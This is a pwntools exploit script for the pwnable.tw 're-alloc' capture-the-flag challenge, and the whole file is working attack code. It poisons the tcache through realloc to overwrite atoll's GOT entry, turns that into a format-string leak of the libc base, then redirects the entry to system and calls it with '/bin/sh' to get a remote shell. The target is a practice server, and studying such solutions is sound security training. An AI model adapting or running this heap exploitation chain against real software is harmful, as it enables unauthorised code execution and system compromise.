
from pwn import *

#p = process('./re-alloc')
p = remote('chall.pwnable.tw',10106)
bin = ELF('./re-alloc')
#libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
libc = ELF('./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so')
context.log_level = 'debug'

def alloc(index,size,data):
        p.sendlineafter('Your choice: ',str(1))
        p.sendlineafter('Index:',str(index))
        p.sendlineafter('Size:',str(size))
        p.sendafter('Data:',data)
def realloc(index,size,data):
        p.sendlineafter('Your choice: ',str(2))
        p.sendlineafter('Index:',str(index))
        p.sendlineafter('Size:',str(size))
        if data != '':
                p.sendafter('Data:',data)
def free(index):
        p.sendlineafter('Your choice: ',str(3))
        p.sendafter('Index:',index)

#gdb.attach(p,"""break *0x4016da break *0x40129d """)
#tcache size 0x30 point to atoll got
alloc(0,0x20,'AAAA')
realloc(0,0,'')
realloc(0,0x30,p64(bin.got['atoll']))
alloc(1,0x20,'BBBB')
realloc(0,0x40,'CCCC')
free('0')
realloc(1,0x50,'DDDD')
free('1')

#tcache size 0x40 point to atoll got
alloc(0,0x10,'AAAA')
realloc(0,0,'')
realloc(0,0x60,p64(bin.got['atoll']))
alloc(1,0x10,'BBBB')
free('0')
realloc(1,0x70,'CCCC')
free('1')

#print@plt -> atoll got
alloc(0,0x20,p64(0x401070))
free('%21$p')
#free('%3$p')
#pause()
leak_val = int(p.recv(14),16)
#libc.address = leak_val - libc.sym['__read_chk'] - 9
libc.address = leak_val - libc.sym['__libc_start_main'] - 235
log.info('leak_val:' + hex(leak_val))
log.info('libc_address:' + hex(libc.address))
log.info('libc_address:' + hex(libc.sym['system']))
#pause()

p.sendlineafter('Your choice: ','1')
p.sendafter('Index:','1')
p.sendafter('Size:',0x10*'A')
p.sendafter('Data:',p64(libc.sym['system']))

#pause()
free('/bin/sh\x00')
p.interactive()

